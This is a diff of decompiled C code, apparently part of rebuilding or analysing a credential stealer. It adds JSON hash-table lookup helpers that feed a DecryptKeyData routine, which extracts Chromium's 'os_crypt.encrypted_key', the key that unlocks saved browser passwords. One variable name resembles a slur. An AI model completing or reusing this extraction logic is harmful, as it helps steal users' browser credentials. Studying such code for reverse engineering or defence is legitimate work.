@@ -163,7 +163,9 @@ LABEL_12:
   return (_DWORD *)resultData;
 }
 
-DWORD *__thiscall StripUTF8BOMAndParse(const char *encryptedKey){
+DWORD *__thiscall 
+StripUTF8BOMAndParse(const char *encryptedKey)
+{
     if (encryptedKey == NULL) {
         return NULL;
     }
@@ -177,10 +179,136 @@ DWORD *__thiscall StripUTF8BOMAndParse(const char *encryptedKey){
     return ParseKeyValueData(&niggi, 0);
 }
 
-int __thiscall ValidateKeyStructure(DWORD *keyV)
+int __fastcall PerformHashTableLookup(
+        _DWORD *hashTable,
+        const char *queryString,
+        size_t queryLength,
+        int queryHash,
+        _DWORD *foundFlag)
+{
+  unsigned int tableSize;
+  int probeOffset;
+  int hashIndex;
+  int currentIndex;
+  int entryIndex;
+  char *storedString;
+  int originalHashIndex;
+
+  tableSize = hashTable[8];
+  probeOffset = 0;
+  *foundFlag = 0;
+  hashIndex = queryHash & (tableSize - 1);
+  originalHashIndex = hashIndex;
+
+  if (!tableSize)
+    return -1;
+
+  while (1)
+  {
+    currentIndex = (tableSize - 1) & (probeOffset + hashIndex);
+    entryIndex = *(_DWORD *)(hashTable[1] + 4 * currentIndex);
+
+    if (entryIndex == -1)
+      break;
+
+    hashIndex = originalHashIndex;
+
+    if (queryHash == *(_DWORD *)(hashTable[2] + 4 * entryIndex))
+    {
+      storedString = *(char **)(hashTable[3] + 4 * entryIndex);
+
+      if (strlen(storedString) == queryLength)
+      {
+        if (!strncmp(queryString, storedString, queryLength))
+        {
+          *foundFlag = 1;
+          return currentIndex;
+        }
+        hashIndex = originalHashIndex;
+      }
+    }
+
+    tableSize = hashTable[8];
+    if (++probeOffset >= tableSize)
+      return -1;
+  }
+
+  return currentIndex;
+}
+
+int __fastcall
+ComputeDJB2Hash(int inputString,
+                unsigned int inputLength)
+{
+  unsigned int index;
+  int hash;
+  unsigned __int8 currentChar;
+
+  index = 0;
+  for ( hash = 5381; index < inputLength; ++index )
+  {
+    currentChar = *(_BYTE *)(index + inputString);
+    if ( !currentChar )
+      break;
+    hash = currentChar + 33 * hash;
+  }
+  return hash;
+}
+
+int __fastcall 
+LookupHashedIndexValue(DWORD *table, 
+                       const char *inputString, 
+                       size_t inputLength)
+{
+  int hashValue;
+  int lookupIndex;
+  int foundFlag;
+
+  if ( table
+    && inputString
+    && (hashValue = ComputeDJB2Hash((int)inputString, inputLength),
+        foundFlag = 0,
+        lookupIndex = PerformHashTableLookup(table, inputString, inputLength, hashValue, &foundFlag),
+        foundFlag) )
+  {
+    return *(_DWORD *)(table[4] + 4 * *(_DWORD *)(table[1] + 4 * lookupIndex));
+  }
+  else
+  {
+    return 0;
+  }
+}
+
+int __thiscall 
+ValidateKeyStructure(DWORD *keyV)
 {
   if ( keyV && keyV[1] == 4 )
     return keyV[2];
+  else
+    return 0;
+}
+
+int __fastcall 
+ExtractValueFromKeyPath(DWORD *table, 
+                        const char *key)
+{
+  const char *segmentStart;
+  char *dotPosition;
+  DWORD *hashedValue;
+  char *nextSegment;
+
+  segmentStart = key;
+  for ( dotPosition = strchr(key, '.'); ; dotPosition = strchr(nextSegment + 1, '.') )
+  {
+    nextSegment = dotPosition;
+    if ( !dotPosition )
+      break;
+    hashedValue = (_DWORD *)LookupHashedIndexValue(table, segmentStart, dotPosition - segmentStart);
+    segmentStart = nextSegment + 1;
+    table = (_DWORD *)ValidateKeyStructure(hashedValue);
+  }
+  if ( table && segmentStart )
+    return LookupHashedIndexValue(table, segmentStart, strlen(segmentStart));
   else
     return 0;
 }
@@ -201,8 +329,8 @@ DecryptKeyData(const WCHAR *TheRealOne_,
     ExtractFileInfoViaNTDLL(TheRealOne_, (unsigned int *)&encryptedKey, &resultLength);
     Resutl = (DWORD *)StripUTF8BOMAndParse(encryptedKey);
     Resutl_ = (DWORD *)ValidateKeyStructure(Resutl);
-    Resutl__ = (DWORD *)ExtractValueFromKeyPath(Resutl_, "os_crypt.encrypted_key");   // IM HERE 
-    keyStorageLocation = RetrieveKeyFromStructure(Resutl__);
+    Resutl__ = (DWORD *)ExtractValueFromKeyPath(Resutl_, "os_crypt.encrypted_key");
+    keyStorageLocation = RetrieveKeyFromStructure(Resutl__);  // IM HERE 
 
     if (keyStorageLocation) {
         encryptedKey_ = *keyStorageLocation;
